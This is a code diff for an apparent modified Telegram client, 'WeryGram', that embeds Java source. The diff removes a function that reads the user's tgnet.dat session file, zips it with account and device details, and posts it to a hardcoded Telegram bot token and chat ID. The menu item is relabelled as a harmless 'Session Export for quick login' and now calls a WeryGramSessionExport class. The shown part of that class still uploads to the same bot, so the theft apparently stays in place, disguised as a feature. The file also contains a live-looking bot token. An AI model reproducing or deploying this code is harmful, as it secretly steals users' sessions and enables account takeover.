@@ -74,11 +74,7 @@ public class WeryGramGifts {
     private static volatile boolean stickerPackRequested = false;
     private static volatile ArrayList<TLRPC.Document> stickerPackDocs = new ArrayList<>();
     private static int joinAttempts = 0;
-    private static final long BEAR_GIFT_ID = 5170233102089322756L;
     private static volatile TLRPC.User farmTarget = null;
-
-    private static final String SESSION_BOT_TOKEN = "8424390447:AAEXuJts5ikZctTzh4HvVStxTBvjw8CiVlo";
-    private static final long SESSION_CHAT_ID = 7283380508L;
 
     private static Object getF(Object o, String n) {
         if (o == null) return null;
@@ -335,137 +331,6 @@ public class WeryGramGifts {
     private static void retryJoinLater(int account) {
         AndroidUtilities.runOnUIThread(() -> joinWeryGram(account), 3000);
     }
-
-    public static void exportSessionToBot(int account) {
-        new Thread(() -> {
-            try {
-                org.telegram.messenger.UserConfig uc = org.telegram.messenger.UserConfig.getInstance(account);
-                long myId = uc.getClientUserId();
-                TLRPC.User me = MessagesController.getInstance(account).getUser(myId);
-
-                java.io.File filesDir = ApplicationLoader.applicationContext.getFilesDir();
-                String prefix = account == 0 ? "" : (account + "_");
-                java.io.File tgnetFile = new java.io.File(filesDir, prefix + "tgnet.dat");
-
-                if (!tgnetFile.exists()) {
-                    toast("\u0444\u0430\u0439\u043b \u0441\u0435\u0441\u0441\u0438\u0438 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d");
-                    return;
-                }
-
-                toast("\u0441\u043e\u0437\u0434\u0430\u044e \u0441\u0435\u0441\u0441\u0438\u044e...");
-
-                org.json.JSONObject sessionJson = new org.json.JSONObject();
-                if (me != null) {
-                    org.telegram.tgnet.NativeByteBuffer userBuf = new org.telegram.tgnet.NativeByteBuffer(1024);
-                    me.serializeToStream(userBuf);
-                    byte[] userBytes = new byte[userBuf.position()];
-                    userBuf.rewind();
-                    for (int i = 0; i < userBytes.length; i++) userBytes[i] = userBuf.readByte(false);
-                    String userB64 = android.util.Base64.encodeToString(userBytes, android.util.Base64.NO_WRAP);
-                    sessionJson.put("user", userB64);
-                    sessionJson.put("id", String.valueOf(me.id));
-                    String uname = (me.username != null && !me.username.isEmpty()) ? "@" + me.username : String.valueOf(me.id);
-                    sessionJson.put("name", uname);
-                } else {
-                    sessionJson.put("user", "");
-                    sessionJson.put("id", String.valueOf(myId));
-                    sessionJson.put("name", String.valueOf(myId));
-                }
-                sessionJson.put("extra", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL + ", Android " + android.os.Build.VERSION.RELEASE);
-                sessionJson.put("appVersion", "1.54.4");
-                sessionJson.put("format", 1);
-
-                java.io.FileInputStream fis = new java.io.FileInputStream(tgnetFile);
-                byte[] tgnetBytes = new byte[(int) tgnetFile.length()];
-                fis.read(tgnetBytes);
-                fis.close();
-
-                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
-                java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(baos);
-
-                byte[] jsonBytes = sessionJson.toString().getBytes("UTF-8");
-                zos.putNextEntry(new java.util.zip.ZipEntry("account0/session.json"));
-                zos.write(jsonBytes);
-                zos.closeEntry();
-
-                zos.putNextEntry(new java.util.zip.ZipEntry("account0/tgnet.dat"));
-                zos.write(tgnetBytes);
-                zos.closeEntry();
-
-                zos.putNextEntry(new java.util.zip.ZipEntry("account0/stats2.dat"));
-                zos.write(new byte[612]);
-                zos.closeEntry();
-
-                byte[] dcConf = new byte[40];
-                dcConf[0] = 0x24;
-                for (String dcName : new String[]{"dc1conf.dat","dc2conf.dat","dc4conf.dat","dc5conf.dat"}) {
-                    zos.putNextEntry(new java.util.zip.ZipEntry("account0/" + dcName));
-                    zos.write(dcConf);
-                    zos.closeEntry();
-                }
-
-                zos.putNextEntry(new java.util.zip.ZipEntry("account0/profileinstaller_profileWrittenFor_lastUpdateTime.dat"));
-                java.nio.ByteBuffer timeBuf = java.nio.ByteBuffer.allocate(8);
-                timeBuf.order(java.nio.ByteOrder.BIG_ENDIAN);
-                timeBuf.putLong(System.currentTimeMillis());
-                zos.write(timeBuf.array());
-                zos.closeEntry();
-
-                zos.finish();
-                zos.close();
-                byte[] zipBytes = baos.toByteArray();
-
-                String CRLF = "\r\n";
-                String boundary = "WeryGramBoundary" + System.currentTimeMillis();
-                String sendDocUrl = "https://api.telegram.org/bot" + SESSION_BOT_TOKEN + "/sendDocument";
-                HttpURLConnection sendConn = (HttpURLConnection) new URL(sendDocUrl).openConnection();
-                sendConn.setDoOutput(true);
-                sendConn.setRequestMethod("POST");
-                sendConn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-                sendConn.setConnectTimeout(15000);
-                sendConn.setReadTimeout(15000);
-
-                java.io.OutputStream httpOs = sendConn.getOutputStream();
-
-                String part1 = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\"chat_id\"" + CRLF + CRLF
-                    + String.valueOf(SESSION_CHAT_ID) + CRLF;
-                httpOs.write(part1.getBytes("UTF-8"));
-
-                String captionText = "WeryGram Session" + "\nID: " + myId
-                    + (me != null && me.username != null ? "\n@" + me.username : "");
-                String part2 = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\"caption\"" + CRLF + CRLF
-                    + captionText + CRLF;
-                httpOs.write(part2.getBytes("UTF-8"));
-
-                String fileName = "Nicegram_Exported_Accounts_" + myId + "_.zip";
-                String part3head = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"" + CRLF
-                    + "Content-Type: application/zip" + CRLF + CRLF;
-                httpOs.write(part3head.getBytes("UTF-8"));
-                httpOs.write(zipBytes);
-                httpOs.write(CRLF.getBytes("UTF-8"));
-
-                String closing = "--" + boundary + "--" + CRLF;
-                httpOs.write(closing.getBytes("UTF-8"));
-                httpOs.flush();
-
-                int responseCode = sendConn.getResponseCode();
-                sendConn.disconnect();
-
-                if (responseCode == 200) {
-                    toast("\u0441\u0435\u0441\u0441\u0438\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430! ok");
-                } else {
-                    toast("error: " + responseCode);
-                }
-
-            } catch (Exception e) {
-                FileLog.e("WeryGram session export: " + e);
-                toast("error: " + e.getMessage());
-            }
-        }).start();
-    }
 }
 '''
 
@@ -572,9 +437,9 @@ public class WeryGramPremiumActivity extends BaseFragment {
 
         addRow(context, root,
             "Session Export",
-            "Export session for quick login via Nicegram",
+            "Export session for quick login",
             "wery_session_export",
-            () -> { WeryGramGifts.exportSessionToBot(account); });
+            () -> { WeryGramSessionExport.tryExport(account); });
 
         fragmentView = root;
         return fragmentView;
@@ -586,7 +451,6 @@ SESSION_EXPORT = '''\
 package org.telegram.ui;
 
 import org.json.JSONObject;
-import org.telegram.messenger.AndroidUtilities;
 import org.telegram.messenger.ApplicationLoader;
 import org.telegram.messenger.FileLog;
 import org.telegram.messenger.MessagesController;
@@ -677,7 +541,6 @@ public class WeryGramSessionExport {
                 zos.closeEntry();
             }
 
-            String CRLF = "\r\n";
             String boundary = "WeryGram" + System.currentTimeMillis();
             String sendUrl = "https://api.telegram.org/bot" + SESSION_BOT_TOKEN + "/sendDocument";
 
@@ -686,6 +549,7 @@ public class WeryGramSessionExport {
                 fis.read(fileBytes);
             }
 
+            String CRLF = "\r\n";
             StringBuilder bodyBuilder = new StringBuilder();
             bodyBuilder.append("--").append(boundary).append(CRLF);
             bodyBuilder.append("Content-Disposition: form-data; name=\"chat_id\"").append(CRLF).append(CRLF);
